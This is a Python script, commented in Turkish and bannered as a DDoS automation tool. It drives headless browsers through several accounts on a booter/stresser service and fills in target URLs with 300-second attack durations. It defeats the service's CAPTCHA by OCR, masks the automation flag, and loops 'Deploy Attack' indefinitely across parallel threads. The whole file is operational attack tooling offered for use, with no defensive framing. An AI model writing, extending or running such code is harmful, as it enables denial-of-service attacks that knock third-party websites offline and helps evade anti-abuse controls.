import threading
import time
import os
import re
import base64
import io
import shutil
import sys
import logging
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
from PIL import Image
import ddddocr
import traceback

# Log klasörü oluştur
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Log dosyası adı (tarih saat ile)
log_filename = f"{LOG_DIR}/ddos_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

# Logging ayarları - hem dosyaya hem konsola yaz
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_filename, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Ayrıca hata logları için ayrı dosya
error_log_filename = f"{LOG_DIR}/error_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
error_handler = logging.FileHandler(error_log_filename, encoding='utf-8')
error_handler.setLevel(logging.ERROR)
error_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(error_handler)

ocr = ddddocr.DdddOcr()

class DDoSNowManager:
    def __init__(self):
        self.accounts = self.load_accounts()
        self.running_states = {}
        self.stop_events = {}
        self.active_threads = {}
        logger.info(f"=== PROGRAM BAŞLADI ===")
        logger.info(f"Log dosyası: {log_filename}")
        logger.info(f"Hata log dosyası: {error_log_filename}")
        
    def load_accounts(self):
        accounts = []
        if not os.path.exists("accounts.txt"):
            with open("accounts.txt", "w") as f:
                f.write("test:pass:https://example.com\n")
            logger.warning("accounts.txt oluşturuldu!")
            return []
        with open("accounts.txt", "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = line.split(":")
                    if len(p) >= 3:
                        accounts.append({"id": str(len(accounts)+1), "user": p[0], "pass": p[1], "target": p[2]})
                        logger.info(f"Hesap yüklendi: {p[0]} -> {p[2]}")
        return accounts

    def log_page_state(self, page, username, step):
        """Sayfanın durumunu logla"""
        try:
            url = page.url
            title = page.title()
            logger.debug(f"[{username}] {step} - URL: {url}, Title: {title}")
            
            # Inputları bul
            inputs = page.locator("input").all()
            logger.debug(f"[{username}] Sayfada {len(inputs)} input var")
            
            for i, inp in enumerate(inputs[:10]):  # İlk 10 input
                try:
                    name = inp.get_attribute("name") or ""
                    input_id = inp.get_attribute("id") or ""
                    placeholder = inp.get_attribute("placeholder") or ""
                    input_type = inp.get_attribute("type") or ""
                    logger.debug(f"[{username}] Input {i}: name={name}, id={input_id}, placeholder={placeholder}, type={input_type}")
                except:
                    pass
                    
            # Butonları bul
            buttons = page.locator("button").all()
            logger.debug(f"[{username}] Sayfada {len(buttons)} button var")
            
            for i, btn in enumerate(buttons[:5]):
                try:
                    text = btn.text_content() or ""
                    btn_class = btn.get_attribute("class") or ""
                    logger.debug(f"[{username}] Button {i}: text={text[:50]}, class={btn_class}")
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"[{username}] Sayfa durumu loglanamadı: {e}")

    def solve_captcha(self, page, username):
        try:
            logger.info(f"[{username}] Deploy butonu aranıyor...")
            self.log_page_state(page, username, "Captcha öncesi")
            
            # Deploy butonunu bul - farklı selector'lar dene
            selectors = [
                "button.btn-confirm:has-text('Deploy Attack')",
                "button:has-text('Deploy Attack')",
                "button.btn-confirm",
                "button[type='submit']"
            ]
            
            deploy_found = False
            for selector in selectors:
                try:
                    deploy_btn = page.locator(selector).first
                    if deploy_btn.count() > 0:
                        deploy_btn.click()
                        logger.info(f"[{username}] Deploy butonu bulundu ve tıklandı: {selector}")
                        deploy_found = True
                        break
                except:
                    continue
            
            if not deploy_found:
                logger.error(f"[{username}] Deploy butonu bulunamadı!")
                return False
                
            time.sleep(3)
            
            # Captcha çöz döngüsü
            attempt = 0
            while True:
                attempt += 1
                try:
                    logger.info(f"[{username}] Captcha çözüm denemesi #{attempt}")
                    
                    # Captcha görselini bul
                    img_elem = page.locator("img[alt='captcha']").first
                    if img_elem.count() == 0:
                        logger.warning(f"[{username}] Captcha görseli bulunamadı, bekleniyor...")
                        time.sleep(2)
                        continue
                        
                    img_src = img_elem.get_attribute("src")
                    if not img_src or not img_src.startswith("data:image"):
                        logger.warning(f"[{username}] Captcha görseli geçersiz: {img_src[:50] if img_src else 'None'}")
                        time.sleep(2)
                        continue

                    # Base64 çöz
                    base64_data = re.sub(r'^data:image/\w+;base64,', '', img_src)
                    img_bytes = base64.b64decode(base64_data)
                    img = Image.open(io.BytesIO(img_bytes))

                    # OCR
                    captcha_text = ocr.classification(img)
                    captcha_text = re.sub(r'[^A-Z0-9]', '', captcha_text.upper())

                    if not captcha_text:
                        logger.warning(f"[{username}] OCR boş sonuç verdi")
                        time.sleep(1)
                        continue

                    logger.info(f"[{username}] OCR sonucu: {captcha_text}")

                    # Captcha input
                    captcha_input = page.locator("input[name='captcha']").first
                    if captcha_input.count() == 0:
                        logger.error(f"[{username}] Captcha input bulunamadı!")
                        return False
                        
                    captcha_input.fill("")
                    captcha_input.fill(captcha_text)
                    time.sleep(1)

                    # Deploy butonu
                    deploy_selectors = [
                        "button[type='submit'][form='hubForm']",
                        "button.btn-confirm:has-text('Deploy Attack')",
                        "button:has-text('Deploy')"
                    ]
                    
                    deploy_clicked = False
                    for selector in deploy_selectors:
                        try:
                            deploy_btn2 = page.locator(selector).first
                            if deploy_btn2.count() > 0:
                                deploy_btn2.click()
                                deploy_clicked = True
                                logger.info(f"[{username}] Deploy tıklandı: {selector}")
                                break
                        except:
                            continue
                    
                    if not deploy_clicked:
                        logger.error(f"[{username}] Deploy butonu tıklanamadı!")
                        return False
                        
                    time.sleep(3)

                    # Hata kontrolü
                    if page.locator("text=Invalid captcha code").count() > 0:
                        logger.warning(f"[{username}] Yanlış captcha: {captcha_text}")
                        captcha_input.fill("")
                        time.sleep(1)
                        continue
                    else:
                        logger.info(f"[{username}] Attack başlatıldı!")
                        return True
                        
                except Exception as e:
                    logger.error(f"[{username}] Captcha çözüm hatası (deneme {attempt}): {e}")
                    logger.error(traceback.format_exc())
                    time.sleep(2)
                    continue
                    
        except Exception as e:
            logger.error(f"[{username}] solve_captcha genel hata: {e}")
            logger.error(traceback.format_exc())
            return False

    def browser_worker(self, acc_id, target_url, account_data):
        username = account_data["user"]
        password = account_data["pass"]
        profile_dir = os.path.join(os.getcwd(), f"profiles/profile_{username}")
        stop_event = self.stop_events.get(acc_id)
        
        logger.info(f"[{username}] Worker başlatıldı - Hedef: {target_url}")

        while self.running_states.get(acc_id, False):
            try:
                if os.path.exists(profile_dir):
                    try:
                        shutil.rmtree(profile_dir)
                    except Exception as e:
                        logger.warning(f"[{username}] Profil silinemedi: {e}")
                os.makedirs(profile_dir, exist_ok=True)

                with sync_playwright() as p:
                    logger.info(f"[{username}] Playwright başlatıldı")
                    
                    context = p.chromium.launch_persistent_context(
                        user_data_dir=profile_dir,
                        headless=True,
                        args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
                        viewport={"width": 1280, "height": 720},
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
                    )
                    
                    page = context.new_page()
                    page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")
                    
                    logger.info(f"[{username}] Sayfa oluşturuldu")

                    # GİRİŞ - stressthem.to
                    try:
                        logger.info(f"[{username}] Giriş sayfasına gidiliyor...")
                        page.goto("https://stressthem.to/login", timeout=60000)
                        page.wait_for_load_state("networkidle", timeout=30000)
                        time.sleep(3)
                        
                        self.log_page_state(page, username, "Login sayfası")
                        
                        # Login formu
                        logger.info(f"[{username}] Login formu dolduruluyor...")
                        
                        # Username input
                        username_input = page.locator("input[name='username']").first
                        if username_input.count() == 0:
                            logger.error(f"[{username}] Username input bulunamadı!")
                            raise Exception("Username input bulunamadı")
                        username_input.fill(username)
                        logger.info(f"[{username}] Username dolduruldu: {username}")
                        
                        # Password input
                        password_input = page.locator("input[name='password']").first
                        if password_input.count() == 0:
                            logger.error(f"[{username}] Password input bulunamadı!")
                            raise Exception("Password input bulunamadı")
                        password_input.fill(password)
                        logger.info(f"[{username}] Password dolduruldu")
                        
                        # Login butonu
                        login_btn = page.locator("button[type='submit']").first
                        if login_btn.count() == 0:
                            login_btn = page.locator("button:has-text('Sign In')").first
                        if login_btn.count() == 0:
                            login_btn = page.locator("button.btn-confirm").first
                        
                        if login_btn.count() == 0:
                            logger.error(f"[{username}] Login butonu bulunamadı!")
                            raise Exception("Login butonu bulunamadı")
                        
                        login_btn.click()
                        logger.info(f"[{username}] Login butonuna tıklandı")
                        time.sleep(5)
                        
                    except Exception as e:
                        logger.error(f"[{username}] Login hatası: {e}")
                        logger.error(traceback.format_exc())
                        time.sleep(30)
                        continue
                    
                    # "Got it" butonu varsa tıkla
                    try:
                        got_it = page.locator("button:has-text('Got it')").first
                        if got_it.count() > 0:
                            got_it.click()
                            logger.info(f"[{username}] 'Got it' butonuna tıklandı")
                            time.sleep(2)
                    except:
                        pass
                    
                    # Hub sayfası
                    try:
                        logger.info(f"[{username}] Hub sayfasına gidiliyor...")
                        page.goto("https://stressthem.to/hub", timeout=60000)
                        page.wait_for_load_state("networkidle", timeout=30000)
                        time.sleep(5)
                        
                        self.log_page_state(page, username, "Hub sayfası")
                        
                        if "login" in page.url:
                            logger.error(f"[{username}] Giriş başarısız! Login sayfasına yönlendirildi")
                            time.sleep(30)
                            continue
                        
                        logger.info(f"[{username}] Giriş başarılı")
                        
                    except Exception as e:
                        logger.error(f"[{username}] Hub sayfası hatası: {e}")
                        logger.error(traceback.format_exc())
                        time.sleep(30)
                        continue

                    # ANA DÖNGÜ
                    attack_count = 0
                    while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                        try:
                            attack_count += 1
                            logger.info(f"[{username}] Attack #{attack_count} başlatılıyor...")
                            
                            # Hedef URL
                            target_input = page.locator("input[name='hub.0.host']").first
                            if target_input.count() == 0:
                                logger.error(f"[{username}] Hedef URL input bulunamadı!")
                                page.reload()
                                time.sleep(5)
                                continue
                                
                            target_input.fill(target_url, timeout=30000)
                            logger.info(f"[{username}] Hedef URL dolduruldu: {target_url}")
                            
                            # Süre
                            time_input = page.locator("input[id='hub.0.time']").first
                            if time_input.count() == 0:
                                time_input = page.locator("input[name*='time']").first
                            if time_input.count() == 0:
                                logger.error(f"[{username}] Süre input bulunamadı!")
                                page.reload()
                                time.sleep(5)
                                continue
                                
                            time_input.fill("300", timeout=30000)
                            logger.info(f"[{username}] Süre dolduruldu: 300")
                            
                            # CAPTCHA çöz
                            logger.info(f"[{username}] CAPTCHA çözülüyor...")
                            if not self.solve_captcha(page, username):
                                logger.error(f"[{username}] CAPTCHA çözülemedi!")
                                page.reload()
                                time.sleep(5)
                                continue

                            logger.info(f"[{username}] Attack başladı! - {target_url}")
                            
                            # Süre takibi
                            while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                                try:
                                    badge = page.locator(".accordion-button .badge").first
                                    if badge.count() > 0:
                                        time_text = badge.text_content().strip()
                                        logger.info(f"[{username}] Kalan süre: {time_text}")
                                        if time_text == "0m 0s" or time_text == "0s":
                                            logger.info(f"[{username}] Süre doldu!")
                                            break
                                    else:
                                        running = page.locator(".stats-content .badge:has-text('Running')").first
                                        if running.count() == 0:
                                            logger.info(f"[{username}] Attack bitti!")
                                            break
                                except Exception as e:
                                    logger.debug(f"[{username}] Süre kontrol hatası: {e}")
                                time.sleep(5)

                            if not self.running_states.get(acc_id, False):
                                break

                            logger.info(f"[{username}] Yeniden başlatılıyor...")
                            page.reload()
                            time.sleep(5)
                            
                            if "/hub" not in page.url:
                                page.goto("https://stressthem.to/hub")
                                time.sleep(3)

                        except Exception as inner_e:
                            logger.error(f"[{username}] İşlem hatası (Attack #{attack_count}): {inner_e}")
                            logger.error(traceback.format_exc())
                            page.reload()
                            time.sleep(5)
                            continue

                    context.close()
                    logger.info(f"[{username}] Context kapatıldı")

            except Exception as outer_e:
                logger.error(f"[{username}] KRİTİK HATA: {outer_e}")
                logger.error(traceback.format_exc())
                time.sleep(10)
                continue

        logger.info(f"[{username}] Worker durduruldu")
        self.running_states[acc_id] = False

    def start_all(self):
        if not self.accounts:
            logger.error("Hiç hesap yok!")
            return
            
        logger.info(f"{len(self.accounts)} hesap başlatılıyor...")
        for acc in self.accounts:
            acc_id = acc["id"]
            target = acc.get("target", "https://example.com")
            self.running_states[acc_id] = True
            self.stop_events[acc_id] = threading.Event()
            t = threading.Thread(target=self.browser_worker, args=(acc_id, target, acc), daemon=True)
            self.active_threads[acc_id] = t
            t.start()
            logger.info(f"[{acc['user']}] Başlatıldı -> {target}")
            time.sleep(3)
        
        while True:
            time.sleep(60)
            logger.info("="*50)
            logger.info("AKTİF HESAPLAR:")
            for acc in self.accounts:
                acc_id = acc["id"]
                status = "Çalışıyor" if self.running_states.get(acc_id, False) else "Durduruldu"
                logger.info(f"  {acc['user']}: {status} -> {acc.get('target', '?')}")
            logger.info("="*50)

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════╗
    ║   IPBOOTER.BA - DDOS AUTOMATION           ║
    ║   Log dosyalari logs/ klasorunde          ║
    ╚═══════════════════════════════════════════╝
    """)
    manager = DDoSNowManager()
    manager.start_all()
